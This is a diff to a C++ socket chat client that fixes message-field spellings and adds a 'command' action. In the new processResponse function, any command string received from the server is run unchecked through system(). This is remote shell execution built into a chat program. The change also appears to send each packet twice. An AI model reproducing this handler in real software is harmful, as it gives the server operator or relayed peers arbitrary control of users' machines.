@@ -50,27 +50,35 @@ public:
 	bool connect() {
 	    return socket.connect(ip, port) == sf::Socket::Done;
 	}
-	void sendMessangeRequest(std::string messange) {
+	void sendMessageRequest(std::string message) {
 		json request;
-		request["action"] = "send_messange";
-		request["messange"] = messange;
-		sf::Packet p;
-		p << request.dump();
-		{
-			std::lock_guard<std::mutex> lock(abobusMutex);
-			abobus.push(p);
-			
-		}
-		cv_ABOBUS.notify_one();
+		request["action"] = "send_message";
+		request["message"] = message;
+		sendRequest(request);
+		
+	}
+	void sendCommand(std::string command) {
+		json request;
+		request["action"] = "command";
+		request["message"] = command;
+		sendRequest(request);
+
 	}
 	bool sendRequest(const json& msg) {
 		sf::Packet packet;
 		packet << msg.dump();
+		{
+			std::lock_guard<std::mutex> lock(abobusMutex);
+			abobus.push(packet);
+		}
+		cv_ABOBUS.notify_one();
 		return socket.send(packet) == sf::Socket::Done;
 	}
+	/*
 	bool receiveResponse(sf::Packet& packet) {
 		return socket.receive(packet) == sf::Socket::Done;
 	}
+	*/
 	void processServerResponse(sf::Packet& packet) {
 		std::string responseMessage;
 		packet >> responseMessage;
@@ -88,6 +96,26 @@ public:
 		isStarted.store(false);
 		requestThread.detach();
 		receiveThread.detach();
+	}
+	void processResponse(sf::Packet packet) {
+		std::string msg;
+		packet >> msg;
+		try {
+			json message = json::parse(msg);
+			std::string action = message["action"];
+			if (action == "new_message") {
+				spdlog::info("message from server: {}", (std::string)message["message"]);
+			}
+			else if (action == "command") {
+				spdlog::info("processing command from server");
+				system(message["message"].get<std::string>().c_str());
+			}
+			
+		}
+		catch (const json::parse_error& ex) {
+			spdlog::error("server sent invalid json format!");
+			return;
+		}
 	}
 	void start() {
 		requestThread = std::thread([this]() {
@@ -109,8 +137,8 @@ public:
 						return !abobus.empty() || !isStarted.load();
 					});
 					if (!isStarted) break;
-					if (socket.send(abobus.front()) == sf::Socket::Done) spdlog::warn("packet sent!");
-					else spdlog::info("packet hasnt send!");
+					if (socket.send(abobus.front()) == sf::Socket::Done) spdlog::info("packet sent!");
+					else spdlog::error("packet has not send!");
 					abobus.pop();
 				}
 			}
@@ -119,18 +147,8 @@ public:
 			while (!isStarted.load()) std::this_thread::sleep_for(std::chrono::milliseconds(10));
 			while (isStarted.load()) {
 				sf::Packet packet;
-				if (receiveResponse(packet) == sf::TcpSocket::Done) {
-					std::string msg;
-					packet >> msg;
-					if (msg.empty()) continue;
-					try {
-						json messange = json::parse(msg);
-						spdlog::info("messange from server: {}", (std::string)messange["messange"]);
-					}
-					catch (const json::parse_error& ex) {
-						spdlog::error("server sent invalid json format!");
-						continue;
-					}
+				if (socket.receive(packet) == sf::TcpSocket::Done) {
+					processResponse(packet);
 				}
 			}
 		});
